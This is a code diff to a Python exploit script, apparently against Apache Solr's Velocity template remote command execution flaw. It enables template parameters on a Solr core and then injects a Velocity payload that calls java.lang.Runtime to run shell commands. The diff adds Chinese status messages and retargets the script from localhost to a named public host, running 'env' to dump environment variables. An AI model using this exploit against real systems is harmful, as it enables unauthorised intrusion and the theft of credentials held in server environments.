@@ -1,6 +1,7 @@
+import sys
 import requests
-import time
 import json
+from termcolor import cprint
 from urllib.parse import quote
 
 
@@ -16,12 +17,22 @@ class SolrRce:
         header = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
         }
-        response = requests.get(cort_name_url, headers=header)
+        try:
+            response = requests.get(cort_name_url, headers=header, timeout=1)
+            if response.status_code == 200:
+                cprint('[*] 检查solr配置', 'yellow')
+        except requests.RequestException:
+            cprint('[-] URL: %s 连接失败' % self.url, 'yellow', 'on_red')
+            sys.exit(0)
+
         core_name = list(json.loads(response.text)["status"])
         if core_name:
+            cprint('[*] 获取solr core_name 成功: %s' % core_name[0], 'yellow')
             return core_name[0]
+
         else:
-            raise NameError("solr core name not found !")
+            cprint('[-] 未找到core_name, 请检查solr admin配置 ',  'yellow', 'on_red')
+            sys.exit(0)
 
     def enable_cort_params(self):
         header = {
@@ -41,7 +52,7 @@ class SolrRce:
         }
         params_enable_url = self.url + "/solr/" + self.core_name + "/config"
         response = requests.post(url=params_enable_url, json=body, headers=header)
-        time.sleep(1)
+
         if response.json()["responseHeader"]["status"] == 0:
             return True
         else:
@@ -49,8 +60,11 @@ class SolrRce:
 
     def exp(self):
         if self.available is False:
-            raise ValueError('url: %s is false!' % self.url)
+            cprint('[*] URL: %s 注入失败' % self.url,  'yellow', 'on_red')
+            sys.exit(0)
+
         else:
+            cprint('[*] 修改core name配置成功，尝试系统命令注入', 'yellow')
             exp_code1 = "/select?q=1&&wt=velocity&v.template=custom&v.template.custom="
 
             exp_code2 = "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) " \
@@ -65,10 +79,16 @@ class SolrRce:
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
             }
             cmd_result = requests.get(end_url, headers=header)
-            print("You command result: \n", cmd_result.text)
+            if cmd_result.status_code == 500:
+                cprint('[-] URL: %s 系统命令注入失败' % self.url, 'yellow', 'on_red')
+            else:
+                cprint('[*] 命令执行结果: \n %s' % cmd_result.text, 'yellow')
 
 
-solr_url = "http://127.0.0.1:8983"
-cmd = 'whoami'
+# host = sys.argv[1]
+
+host = 'www.founderfx1.cn'
+solr_url = "http://%s:8983" % host
+cmd = 'env'
 solr = SolrRce(solr_url, cmd)
 solr.exp()
